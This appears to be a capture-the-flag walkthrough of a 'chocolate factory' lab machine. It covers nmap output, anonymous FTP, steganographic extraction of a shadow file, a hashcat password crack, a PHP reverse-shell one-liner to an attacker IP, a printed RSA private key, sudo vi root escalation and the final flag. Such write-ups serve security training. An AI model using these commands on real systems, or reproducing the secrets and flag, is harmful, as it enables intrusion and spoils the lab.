_**SF:.\r\n\x20\x20.'\\\\'\\\\'\\\\'\\\\'\\,`\x20\x20\x20\.\x20\x2 SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\ SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\ SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`.\_\_|\x20\x20`\.\x20\\\x20\x20\\___\ SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_ SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\ SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------- SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/ SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20 SF:\x20\x20\x20\x20\x20\x20\x20\x20|\r\n\x20\x20\x20\x20\x20\x20\x20\\| SF:**_\_\_\_\_\_\_\_\_\_\_**;**\_\_\_\_\_\_\_\_\_\_\_\_\_\_|\r\n\r\nA\x20small\x20hint\x20f SF:rom\x20Mr.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he SF:re!\x20;)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus"\x20"); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%), Linux 5.0 - 5.5 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 5 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel

TRACEROUTE (using port 111/tcp) HOP RTT ADDRESS 1 43.55 ms 10.17.0.1 2 ... 4 5 169.60 ms 10.10.229.79

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 400.57 seconds

\#=============================================================

## ANONYMOUS FTP ALLOWED

\#=============================================================

> ftp 10.10.229.79 Connected to 10.10.229.79. 220 (vsFTPd 3.0.3) Name (10.10.229.79:greedydev): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls 229 Entering Extended Passive Mode (|||36646|) 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum\_room.jpg 226 Directory send OK. ftp> get gum\_room.jpg local: gum\_room.jpg remote: gum\_room.jpg 229 Entering Extended Passive Mode (|||43917|) 150 Opening BINARY mode data connection for gum\_room.jpg (208838 bytes). 100% |\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*| 203 KiB 89.24 KiB/s 00:00 ETA 226 Transfer complete. 208838 bytes received in 00:02 (83.03 KiB/s) ftp> \[1] + 94453 suspended ftp 10.10.229.79

\#==================================

## Extrtacting Data from the image

\#===================================

> steghide extract -sf gum\_room.jpg Enter passphrase: wrote extracted data to "b64.txt".

***

> cat b64.txt | base64 --d

> cat b64.txt | base64 --d daemon:_:18380:0:99999:7::: bin:_:18380:0:99999:7::: sys:_:18380:0:99999:7::: sync:_:18380:0:99999:7::: games:_:18380:0:99999:7::: man:_:18380:0:99999:7::: lp:_:18380:0:99999:7::: mail:_:18380:0:99999:7::: news:_:18380:0:99999:7::: uucp:_:18380:0:99999:7::: proxy:_:18380:0:99999:7::: www-data:_:18380:0:99999:7::: backup:_:18380:0:99999:7::: list:_:18380:0:99999:7::: irc:_:18380:0:99999:7::: gnats:_:18380:0:99999:7::: nobody:_:18380:0:99999:7::: systemd-timesync:_:18380:0:99999:7::: systemd-network:_:18380:0:99999:7::: systemd-resolve:_:18380:0:99999:7::: \_apt:_:18380:0:99999:7::: mysql:!:18382:0:99999:7::: tss:_:18382:0:99999:7::: shellinabox:_:18382:0:99999:7::: strongswan:_:18382:0:99999:7::: ntp:_:18382:0:99999:7::: messagebus:_:18382:0:99999:7::: arpwatch:!:18382:0:99999:7::: Debian-exim:!:18382:0:99999:7::: uuidd:_:18382:0:99999:7::: debian-tor:_:18382:0:99999:7::: redsocks:!:18382:0:99999:7::: freerad:_:18382:0:99999:7::: iodine:_:18382:0:99999:7::: tcpdump:_:18382:0:99999:7::: miredo:_:18382:0:99999:7::: dnsmasq:_:18382:0:99999:7::: redis:_:18382:0:99999:7::: usbmux:_:18382:0:99999:7::: rtkit:_:18382:0:99999:7::: sshd:_:18382:0:99999:7::: postgres:_:18382:0:99999:7::: avahi:_:18382:0:99999:7::: stunnel4:!:18382:0:99999:7::: sslh:!:18382:0:99999:7::: nm-openvpn:_:18382:0:99999:7::: nm-openconnect:_:18382:0:99999:7::: pulse:_:18382:0:99999:7::: saned:_:18382:0:99999:7::: inetsim:_:18382:0:99999:7::: colord:_:18382:0:99999:7::: i2psvc:_:18382:0:99999:7::: dradis:_:18382:0:99999:7::: beef-xss:_:18382:0:99999:7::: geoclue:_:18382:0:99999:7::: lightdm:_:18382:0:99999:7::: king-phisher:_:18382:0:99999:7::: systemd-coredump:!!:18396:::::: \_rpc:_:18451:0:99999:7::: statd:_:18451:0:99999:7::: \_gvm:_:18496:0:99999:7::: charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::

\#========================================================

Here we get some useful information

1. User : Charlie
2. Password Hash : $6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/

The hashing used is SHA-512

Using hashcat :: hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt $6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824

## Password : cn7824

Not working on SSH : There was a login page on the website

Credentials for the website

\#========================================================

There is a input box where we can execute command

Getting a revese shell

php -r '$sock=fsockopen("10.17.5.163",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

Got the connection :: #===================================================== Listening on 0.0.0.0 4444 Connection received on 10.10.229.79 48348 /bin/sh: 0: can't access tty; job control turned off $

Spawning a shell

remember initial recon from nmap

113/tcp open ident? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LDAPSearchReq, LPDString, NULL, RTSPRequest, SMBProgNeg> |\_ http://localhost/key\_rev\_key <- You will find the key here!!!

http://localhost/key\_rev\_key <- You will find the key here!!!

File Found :: -rw-r--r-- 1 charlie charley 8496 Sep 30 2020 key\_rev\_key

using strings command :: strings key\_rev\_key

> > b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

chaging directory to /home/charlie

www-data@chocolate-factory:/home/charlie$ ls -la ls -la total 40 drwxr-xr-x 5 charlie charley 4096 Oct 7 2020 . drwxr-xr-x 3 root root 4096 Oct 1 2020 .. -rw-r--r-- 1 charlie charley 3771 Apr 4 2018 .bashrc drwx------ 2 charlie charley 4096 Sep 1 2020 .cache drwx------ 3 charlie charley 4096 Sep 1 2020 .gnupg drwxrwxr-x 3 charlie charley 4096 Sep 29 2020 .local -rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile -rw-r--r-- 1 charlie charley 1675 Oct 6 2020 teleport -rw-r--r-- 1 charlie charley 407 Oct 6 2020 teleport.pub -rw-r----- 1 charlie charley 39 Oct 6 2020 user.txt

we got our first flag :: user.txt but we dont have any permission

we found ssh key for user: charlie

> cat teleport -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln -----END RSA PRIVATE KEY-----

Saved the key in a file : id\_rsa

sudo ssh -i id\_rsa charlie@10.10.229.79

Logged in as Charlie

## Priv Escalation

On running sudo -l command we get this output

charlie@chocolate-factory:/opt$ sudo -l Matching Defaults entries for charlie on chocolate-factory: env\_reset, mail\_badpass, secure\_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User charlie may run the following commands on chocolate-factory: (ALL : !root) NOPASSWD: /usr/bin/vi charlie@chocolate-factory:/opt$

this entry allows the user to run the vi editor (located at /usr/bin/vi) as any user without password

For priv escaltion : Source GTFO Bin

```
sudo vi -c ':!/bin/sh' /dev/null
```

\======================================================================== charlie@chocolate-factory:/opt$ sudo vi -c ':!/bin/sh' /dev/null

## whoami

root

we got the root access

Naviaget to /root There is a root.py lets run this file It is asking for a key Remember we got a key earlier lets try that key

## python root.py

Enter the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

***

\ \ / /\_\_ \_ \_ / \ \_ \_\_ \_\_\_ | \ | | \_\_\_\_\_ \_\_ |\_ _| |_\_ \_\_\_ \ V / \_ | | | | / \_ \ | '**/ \_ \ | | |/ \_ \ \ /\ / / | | | '\_ \ / \_**\
**| | (**_**) | |**_**| | / \_\_\_ | | | / | |\ | (**_**) \ V V / | | | | | | \_\_/ |**_**|\_/ \_**_**,**_**| /\_/ \_\_| \_**| |_| \_|\_\_\_/ \_/\_/ |_| |_| |_|\_\_\_|

***

/ \_ \_\_ \_\_\_ \_\_ \_\_\_ \_ \_\_ / \_ \ / _| | | | \ \ /\ / / '_ \ / \_ \ '**| | | | | |\_**\
**| |**_**| |\ V V /| | | | \_\_/ | | |**_**| | \_| \_**/ \_/\_/ |_| |_|\_**|\_| \_**/|\_|

***

/ _**| |** \_\_\_ \_\_\_ \_\_\_ | | \_\_ | | \_\_\_ | | | '_ \ / \_ \ / **/ \_ | |/ **_**\` | / \_**_\
_**| |**_**| | | | (**_**) | (**_**| (**_**) | | (**_**| | || / \_**_**|**_**| |\_|\_**/ \_**\_**/|_|\__,_|\__\_\_\_|

***

\| _**|**_** \_ **_**| | \_\_\_ \_ \_\_ \_ \_**_\
_**| | / \` |/ | / \_ | '| | | | | | (| | (| || () | | | |**_**| | |**_**| \_**_**,\_|\_**|\__\_\_\_/|_| \__, | |_\_\_/

flag{cec59161d338fef787fcb4e296b42124}

We got our root flag
